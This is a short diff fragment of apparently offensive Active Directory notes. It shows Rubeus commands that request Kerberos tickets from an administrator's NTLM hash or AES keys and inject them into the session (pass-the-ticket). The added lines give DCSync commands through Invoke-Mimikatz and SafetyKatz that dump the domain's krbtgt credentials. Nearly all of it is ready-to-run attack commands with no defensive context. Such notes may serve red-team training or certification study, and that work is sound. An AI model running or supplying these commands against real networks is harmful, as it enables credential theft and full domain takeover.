@@ -34,3 +34,12 @@ Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
 
 # IN AN ADMIN or ELEVATED SHELL
 Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt
+
+# DCSync
+
+#DCSync for US Domain
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"' 
+
+SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+
+By default, Domain Admins privileges are required to run DCSync
